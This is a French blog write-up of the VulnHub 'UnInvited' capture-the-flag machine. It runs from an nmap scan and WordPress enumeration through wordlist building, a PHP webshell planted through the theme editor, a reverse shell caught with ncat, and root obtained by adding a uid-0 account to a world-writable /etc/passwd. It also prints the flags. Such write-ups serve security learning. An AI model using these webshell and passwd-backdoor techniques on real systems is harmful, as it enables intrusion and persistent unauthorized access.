# Solution du CTF UnInvited de VulnHub

Ouais c'est ça, ouais !
-----------------------

Après [Ganana](http://devloop.users.sourceforge.net/index.php?article261/solution-du-ctf-ganana-de-vulnhub), je me suis penché sur un autre CTF de [Jeevana Chandra](https://jeevanachandra.github.io/) : [UnInvited](https://www.vulnhub.com/entry/uninvited-1,523/). L'objectif annoncé est de récupérer 3 flags sur la VM.  

```plain
$ sudo nmap -sCV -T5 -p- 192.168.56.22 
[sudo] Mot de passe de root :  
Starting Nmap 7.92 ( https://nmap.org )
Nmap scan report for 192.168.56.22 
Host is up (0.0012s latency). 
Not shown: 65532 closed tcp ports (reset) 
PORT      STATE SERVICE VERSION 
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu)) 
|_http-server-header: Apache/2.4.29 (Ubuntu) 
|_http-title: SEC-CORP 
7894/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 
| ssh-hostkey:  
|   2048 af:d2:42:e4:31:ff:4f:fb:0b:de:18:e9:3f:c4:bc:42 (RSA) 
|   256 97:56:47:40:ea:99:b2:a6:1a:a5:59:56:7e:2b:b4:a0 (ECDSA) 
|_  256 b2:b1:67:44:75:f6:d8:32:a2:f2:ff:7f:09:a7:7d:53 (ED25519) 
60000/tcp open  http    Apache httpd 2.4.38 ((Debian)) 
|_http-server-header: Apache/2.4.38 (Debian) 
|_http-title: UNINVITED 
|_http-generator: WordPress 5.4.2 
| http-robots.txt: 1 disallowed entry  
|_/wp-admin/ 
MAC Address: 08:00:27:94:BE:25 (Oracle VirtualBox virtual NIC) 
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Encore un Wordpress, ce qui est un peu lassant sur tous ces CTFs mais vu la popularité du soft ça peut refléter la réalité...  

Au bas du code HTML de la page servie sur le port 80 se trouve une chaîne en base64 qui se décode en :  

> Yeah! I know it happens... I guess u might want to add this [fieldforce] to your hosts

Aussitôt je teste la commande *curl -D- -H 'Host: fieldforce' http://192.168.56.22/* mais je ne voit aucune différence.  

En me rendant sur le port 60000 il ne fait aucun doute que la précédente recommandation s'applique ici puisque l'on trouve dans la page des références à l'hôte *fieldforce*.  

On peut avoir recours à *wpscan* pour obtenir la liste des utilisateurs du Wordpress mais ici *Nuclei* fait aussi bien l'affaire :  

```plain
[2022-02-04 11:44:49] [apache-detect] [http] [info] http://fieldforce:60000/ [Apache/2.4.38 (Debian)] 
[2022-02-04 11:44:52] [wordpress-rdf-user-enum] [http] [info] http://fieldforce:60000/feed/rdf [Elliot] 
[2022-02-04 11:45:10] [wordpress-xmlrpc-listmethods] [http] [info] http://fieldforce:60000/xmlrpc.php 
[2022-02-04 11:45:18] [tech-detect:php] [http] [info] http://fieldforce:60000/ 
[2022-02-04 11:45:18] [metatag-cms] [http] [info] http://fieldforce:60000/ [WordPress 5.4.2] 
[2022-02-04 11:45:18] [wordpress-detect] [http] [info] http://fieldforce:60000/ [5.4.2] 
[2022-02-04 11:51:02] [wordpress-xmlrpc-file] [http] [info] http://fieldforce:60000/xmlrpc.php 
[2022-02-04 11:51:58] [CVE-2017-5487] [http] [medium] http://fieldforce:60000/wp-json/wp/v2/users/ ["name":"Elliot"]
```

Vu que l'on ne dispose de rien de plus et que il n'y a qu'un article sur le blog (interview de l'acteur de *Mr Robot*) on imagine aisément qu'il faille utiliser [CeWL](https://github.com/digininja/cewl) pour générer une wordlist qui servira à bruteforcer le compte *Elliot*.  

Sauf qu'en réalité c'est quasi impossible. [Un article sur Internet](https://noxious.tech/posts/Uninvited/) prétend y être parvenu en utilisant *CeWL* directement pour obtenir dans sa wordlist le mot de passe *wh1ter0se*... C'est faux puisque ce mot n’apparaît nul par sur le wordpress.  

Pour avoir un scénario où le mot de passe attendu apparaîtrait vraiment il faudrait :  

1. Utiliser CeWL en mode groupage de mots comme ceci :  

```bash
docker run --add-host fieldforce:192.168.56.22 -it --rm cewl -g 2 http://fieldforce:60000/2020/07/28/hello-world/ > elliot.txt
```

Cela nous permet d'avoir le nom *White Rose* dans la liste.  

2. Utiliser la règle *multiword* de John :  

```plain
john --rules=multiword --wordlist=elliot.txt --stdout | sort | uniq > words.txt
```

Ce qui permet d'avoir des entrées comme :  

```plain
white rose
whiterose
White rose
Whiterose
WhiteRose
```

3. Utiliser la règle *dive* de John car elle remplace des lettres en chiffres :  

```plain
john --rules=dive --wordlist=words.txt --stdout > wordlist.txt
```

Et à ce stade victoire, le mot de passe attendu *whiter0se* apparaît dans la wordlist.  

Sauf qu'avec tous les mots extrait par *CeWL* au début on se retrouve au final avec une wordlist de 1744030271 entrées soit 121 fois la taille de *RockYou*.  

Et bien oui, moi aussi si on me laisse un siècle pour bruteforcer des comptes non-stop à haut débit demain je hack la NSA bro!  

Bref trouver le mot de passe ici sans chercher une solution sur Internet semble impossible...  

Unpacking
---------

Une fois qu'on a le sésame ça va plus vite. On se connecte au dashboard Wordpress à l'URL */backdoor* (le path a été reconfiguré, on le trouve via une énumération web).  

Dans le *Theme Editor* on tente d'éditer un fichier PHP d'un des thèmes (ça fonctionne avec le thème *Twenty Nineteen*) ce qui nous permet d'avoir un webshell à cette adresse (par exemple) :  

```plain
http://fieldforce:60000/wp-content/themes/twentynineteen/404.php?cmd=id
```

On se retrouve sur une machine avec l'IP 172.18.0.3 et un *.dockerenv* à la racine, nous sommes donc *enfermés* dans un Docker.  

On remarque un utilisateur qui a les fichiers suivants :  

```plain
  4849924      4 -rw-r--r--   1 demodocker demodocker       57 Jul 29  2020 /home/demodocker/.local/note.txt 
  4851206      4 -r--------   1 demodocker demodocker      267 Jul 28  2020 /home/demodocker/user2.txt 
  4849906      4 -r--------   1 demodocker demodocker      283 Jul 29  2020 /home/demodocker/.justanotherday
```

Le fichier *note.txt* doit se décoder en base64 (à deux reprises) pour obtenir l'indice *---ip---/fsociety.exe*  

Effectivement on trouve un exécutable Windows 64 bits *fsociety.exe* à la racine du site.  

En regardant le fichier avec un éditeur hexadécimal on voit des références à Python et surtout à *PyInstaller*.  

J'ai eu recours à [PyInstaller Extractor](https://github.com/extremecoders-re/pyinstxtractor), le bien nommé :  

```plain
$ python3 pyinstxtractor.py fsociety.exe  
[+] Processing fsociety.exe 
[+] Pyinstaller version: 2.1+ 
[+] Python version: 27 
[+] Length of package: 3709332 bytes 
[+] Found 18 files in CArchive 
[+] Beginning extraction...please standby 
[+] Possible entry point: pyiboot01_bootstrap.pyc 
[+] Possible entry point: fsociety.pyc 
[!] Warning: This script is running in a different Python version than the one used to build the executable. 
[!] Please run this script in Python27 to prevent extraction errors during unmarshalling 
[!] Skipping pyz extraction 
[+] Successfully extracted pyinstaller archive: fsociety.exe 

You can now use a python decompiler on the pyc files within the extracted directory
```

En théorie oui, une fois l'extraction passée, la décompilation ne devrait pas poser de problèmes sauf que [uncompyle6](https://github.com/rocky/python-uncompyle6) n'a pas voulu faire le job.  

Pas bien grave, on peut faire un *strings* sur le fichier pyc obtenu :  

```plain
WELCOME TO BACKDOORt 
-------------------s 
+++++++++++++++++++s 
===================t 
mrrobott 
elliots 
USERNAME : s 
PASSWORD : s 
Worng Username Or Password !s 
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\s! 
User has been identified, Welcomes? 
###############################################################s 
TH3 H!N7s> 
Do you know python-reverse-shell client/server socket program?s* 
If IP_Address is 172.18.0.2, use port 9999s* 
If IP_Address is 172.18.0.3, use port 8888s 
Remember 'PATIENCE' is the KEYs 
Ahh! Come On!...s 
Let's try AGAIN!!!!s 
Press Enter! N( 
Falset 
completet 
usert 
raw_inputt 
usernamet 
passwordt
```

Ok donc une machine doit tenter d'établir un reverse shell sur les adresses mentionnées. Nous on est actuellement sur 172.18.0.3 donc il faut rapatrier [un Ncat static](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/ncat) puis écouter sur le port 8888 :  

```plain
$ ncat -v -l -p 8888 
Ncat: Version 6.49BETA1 ( http://nmap.org/ncat ) 
Ncat: Listening on :::8888 
Ncat: Listening on 0.0.0.0:8888 
Ncat: Connection from 172.18.0.1. 
Ncat: Connection from 172.18.0.1:40102. 
id 
uid=1001(docksec) gid=1001(docksec) groups=1001(docksec) 
/home/docksec> ls -al 
total 52 
drwxr-xr-x 7 docksec docksec 4096 Jul 30  2020 . 
drwxr-xr-x 4 root    root    4096 Jul 28  2020 .. 
-rw------- 1 docksec docksec 1045 Jul 30  2020 .bash_history 
-rw-r--r-- 1 docksec docksec  220 Jul 28  2020 .bash_logout 
-rw-r--r-- 1 docksec docksec 3771 Jul 28  2020 .bashrc 
drwx------ 2 docksec docksec 4096 Jul 29  2020 .cache 
drwx------ 3 docksec docksec 4096 Jul 29  2020 .gnupg 
drwxrwxr-x 3 docksec docksec 4096 Jul 28  2020 .local 
-rw-r--r-- 1 docksec docksec  807 Jul 28  2020 .profile 
drwx------ 2 docksec docksec 4096 Jul 29  2020 .secret 
-rw-rw-r-- 1 docksec docksec   66 Jul 29  2020 .selected_editor 
drwx------ 2 docksec docksec 4096 Jul 29  2020 .ssh 
-r-------- 1 docksec docksec  318 Jul 28  2020 user1.txt 
/home/docksec> cat user1.txt 
 _______ __   __ ___ ___     _______  
|       |  |_|  |   |   |   |       | 
|  _____|       |   |   |   |    ___| 
| |_____|       |   |   |   |   |___  
|_____  |       |   |   |___|    ___| 
 _____| | ||_|| |   |       |   |___  
|_______|_|   |_|___|_______|_______| 

FLAG{DASDGFGPXLCKDEG5D7635CSDAFDIMMJDSUWEQDSADIG}
```

La machine sur laquelle on récupère ce shell dispose de nombreuses interfaces réseau, nous somme donc sur l'hôte.  

Avec la commande *crontab -l* on retrouve les deux scripts chargés des reverse shells :  

```plain
* * * * * /usr/bin/python3 /home/docksec/.secret/c1.py 
* * * * * /usr/bin/python3 /home/docksec/.secret/c2.py
```

net user /add
-------------

[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) détecte que le fichier */etc/passwd* est modifiable par tous. Je vais utiliser *mkpasswd* pour avoir un hash correspondant à *toto* :  

```plain
mkpasswd -m sha512crypt 
Mot de passe :  
$6$oCOSAsIhXC.RkvLT$G2KwJNB1m.WM6s2uAF6nmk/Xaas.AAUmUnJHftUkLhrNRSSRNk7PcePrEDucWX92nKKPb4JYnxqm.Jxdr7AGC.
```

Je rajoute alors cette ligne au fichier :  

```plain
toor:$6$oCOSAsIhXC.RkvLT$G2KwJNB1m.WM6s2uAF6nmk/Xaas.AAUmUnJHftUkLhrNRSSRNk7PcePrEDucWX92nKKPb4JYnxqm.Jxdr7AGC.:0:0:toor:/root:/bin/bash
```

Et c'est gagné :  

```plain
$ su toor 
Password:  
root@uninvited:/home/docksec# id 
uid=0(root) gid=0(root) groups=0(root) 
root@uninvited:/home/docksec# cd /root

root@uninvited:~# cat root.txt 
             .__            .__  __             .___  
 __ __  ____ |__| _______  _|___/  |_  ____   __| _/  
|  |  \/    \|  |/    \  \/ |  \   ___/ __ \ / __ |   
|  |  |   |  |  |   |  \   /|  ||  | \  ___// /_/ |   
|____/|___|  |__|___|  /\_/ |__||__|  \___  \____ |   
           \/        \/                   \/     \/ 
FLAG{58DSFJ74RFWESD8J2LKJGHJ87ER4QREWRFLMSTDCMGKAASD}
```

Il ne nous reste plus qu'à accéder au fichier *user2.txt* qui était dans le dossier de l'utilisateur *demodocker* avec des permissions limitées :  

```plain
root@uninvited:~# docker ps 
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                   NAMES 
f950b9c50e1d        wordpress:latest    "docker-entrypoint.s…"   18 months ago       Up 29 hours         0.0.0.0:60000->80/tcp   wordpress_wordpress_1_dd9b95034d3d 
982523fa9f5f        mysql:5.7           "docker-entrypoint.s…"   18 months ago       Up 29 hours         3306/tcp, 33060/tcp     wordpress_db_1_9676244bc9b2 
root@uninvited:~# docker exec -it f950b9c50e1d /bin/bash              
root@f950b9c50e1d:/var/www/html# cd /root 
root@f950b9c50e1d:~# ls 
root@f950b9c50e1d:~# cd /home/demodocker/ 
root@f950b9c50e1d:/home/demodocker# ls 
user2.txt 
root@f950b9c50e1d:/home/demodocker# cat user2.txt  
   ___  ____  _______ __  
  /  _]/    |/ ___/  |  | 
 /  [_|  o  (   \_|  |  | 
|    _]     |\__  |  ~  | 
|   [_|  _  |/  \ |___, | 
|     |  |  |\    |     | 
|_____|__|__| \___|____/   RIGHT ????????                      

FLAG{FPDSNRWEBT513SDASDHTYHMDSARTSIJO32SDFH}
```

Si on oublie cette histoire de mot de passe introuvable alors le reste du CTF n'est pas trop mal.  


*Published February 05 2022 at 17:38*